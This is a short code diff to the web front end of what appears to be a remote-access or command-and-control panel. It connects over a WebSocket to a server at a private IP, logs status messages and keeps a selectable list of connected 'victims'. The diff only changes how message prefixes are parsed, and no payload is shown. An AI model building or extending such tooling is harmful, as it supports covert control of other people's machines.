@@ -98,7 +98,7 @@
   </footer>
 
   <script>
-    const socket = new WebSocket("wss://SERVER-IP:8443/ws");
+    const socket = new WebSocket("wss://192.168.1.12:8443/ws");
     const victimSelect = document.querySelector("#victimSelect");
     const logOutput = document.querySelector("#response");
     const logLines = [];
@@ -110,20 +110,21 @@
 
     socket.onmessage = event => {
       const msg = event.data;
-      const cleanMsg = msg.includes("]") ? msg.split("] ").slice(1).join("] ") : msg;
       const interesting = ["[✅]", "[📄]", "[🟢]", "[🔴]"];
 
-      if (interesting.some(prefix => cleanMsg.startsWith(prefix))) {
+      // Check the original message for interesting prefixes
+      if (interesting.some(prefix => msg.startsWith(prefix))) {
         log(msg);
       }
 
-      if (cleanMsg.startsWith("[🟢] Victim connected: ")) {
-        const match = cleanMsg.match(/Victim connected: (victim-\d+)/);
+      // Use the original message for victim connection/disconnection checks
+      if (msg.startsWith("[🟢] Victim connected: ")) {
+        const match = msg.match(/Victim connected: (victim-\d+)/);
         if (match) addVictim(match[1]);
       }
 
-      if (cleanMsg.startsWith("[🔴] Victim disconnected: ")) {
-        const match = cleanMsg.match(/Victim disconnected: (victim-\d+)/);
+      if (msg.startsWith("[🔴] Victim disconnected: ")) {
+        const match = msg.match(/Victim disconnected: (victim-\d+)/);
         if (match) removeVictim(match[1]);
       }
     };
